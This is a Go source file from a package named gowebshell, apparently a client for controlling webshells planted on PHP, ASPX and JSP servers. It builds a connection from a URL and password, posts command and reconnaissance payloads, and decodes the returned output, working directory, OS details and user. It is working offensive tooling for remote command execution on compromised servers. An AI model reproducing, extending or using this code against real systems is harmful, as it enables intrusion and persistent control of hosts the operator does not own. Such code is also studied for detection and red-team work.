package gowebshell

import (
	"encoding/base64"
	"fmt"
	"github.com/zyylhn/gowebshell/crypto"
	"github.com/zyylhn/gowebshell/utils"
	"strings"
)

var PhpScriptCmd = &PhpCmd{}
var AspxScriptCmd = &AspxCmd{}
var JspScriptCmd = &JspCmd{}
var PhpScriptBaseInfo = &PhpBaseinfo{}
var AspScriptBaseInfo = &AspxBaseinfo{}
var JspScriptBaseInfo = &JspBaseinfo{}

type Webshell struct {
	Url         string             `json:"url"`             //Webshell的Url路径   用户设置
	Password    string             `json:"password"`        //连接密码       用户设置
	Header      map[string]string  `json:"header"`          //http请求的header  用户设置/配置文件指定
	Encode      string             `json:"encode"`          //编码方式     用户设置/配置文件指定/默认UTF8
}

func NewWebshell(url,pass,encode string,header map[string]string) (*Webshell,error) {
	webshell:=&Webshell{}
	header=make(map[string]string)
	if url==""{
		return nil,fmt.Errorf("must set url")
	}
	webshell.Url=url
	if pass==""{
		return nil,fmt.Errorf("must set passworld")
	}
	webshell.Password=pass
	if encode==""{
		encode="utf-8"
	}
	webshell.Encode=encode
	header["Content-Type"]="application/x-www-form-urlencoded"
	webshell.Header=header
	return webshell,nil
}

func (w *Webshell) ExecCommand(pwd,cmd,bash string,scripttype Cmd,op *Options) (*Command,error) {
	if op==nil{
		op=DefaultOption
	}
	var random string
	var base64DecoderResult []byte
	command:=&Command{pwd,cmd,"",bash}
	if op.randomlen!=0{
		random=utils.RandStr(op.randomlen)
	}else {
		random=utils.RandStr(DefaultOption.randomlen)
	}
	//获取body
	body:=scripttype.GetCmdBody(command,w,random)
	//发送数据包并解密返回的结果
	results,err:=GetRespones(w,body,random,op.client)
	if err!=nil{
		return command,fmt.Errorf("无回显结果,或者http请求出错:%v",err)
	}
	if len(results)==0{
		return command,fmt.Errorf("返回结果为空")
	}
	if len(results)<len(random){
		return command,fmt.Errorf("返回结果长度小于随机数长度")
	}
	if results[:len(random)]!=random {
		return command,fmt.Errorf("执行失败，返回随机数错误")
	}
	//去掉随机数并解码
	base64DecoderResult,_=base64.StdEncoding.DecodeString(results[len(random):])
	//特殊字符编码
	base64DecoderResult, _ = crypto.SpecialEncoding(w.Encode,base64DecoderResult)
	resultString:=string(base64DecoderResult)
	if !strings.Contains(resultString,random){
		return command,fmt.Errorf("脚本连接成功，但是执行命令失败")
	}
	//拆分出结果和当前目录
	cmdresult,pwdresult:=getCmdResulrFromBody(resultString)
	command.Result=cmdresult
	command.Pwd=pwdresult
	return command,nil
}

func (w *Webshell) GetBaseInfo(info Info,op *Options) (*BaseInfo,error) {
	if op==nil{
		op=DefaultOption
	}
	var random string
	var base64DecoderResult []byte
	if op.randomlen!=0{
		random=utils.RandStr(op.randomlen)
	}else {
		random=utils.RandStr(DefaultOption.randomlen)
	}
	//获取body
	body:=info.GetBaseInfoBody(w,random)
	//发送数据包并解密返回的结果
	results,err:=GetRespones(w,body,random,op.client)
	if err!=nil{
		return nil,fmt.Errorf("无回显结果,或者http请求出错:%v",err)
	}
	if len(results)==0{
		return nil,fmt.Errorf("返回结果为空")
	}
	if len(results)<len(random){
		return nil,fmt.Errorf("返回结果长度小于随机数长度")
	}
	if results[:len(random)]!=random {
		return nil,fmt.Errorf("执行失败，返回随机数错误")
	}
	//去掉随机数并解码
	base64DecoderResult,_=base64.StdEncoding.DecodeString(results[len(random):])
	//特殊字符编码
	base64DecoderResult, _ = crypto.SpecialEncoding(w.Encode,base64DecoderResult)
	resultString:=string(base64DecoderResult)
	pwd,rootdir,osinfo,user,err:=getBaseResultFromBody(resultString)
	if err!=nil{
		return nil,err
	}
	return &BaseInfo{Pwd: pwd,RootDir: rootdir,Osinfo: osinfo,User: user},nil

}

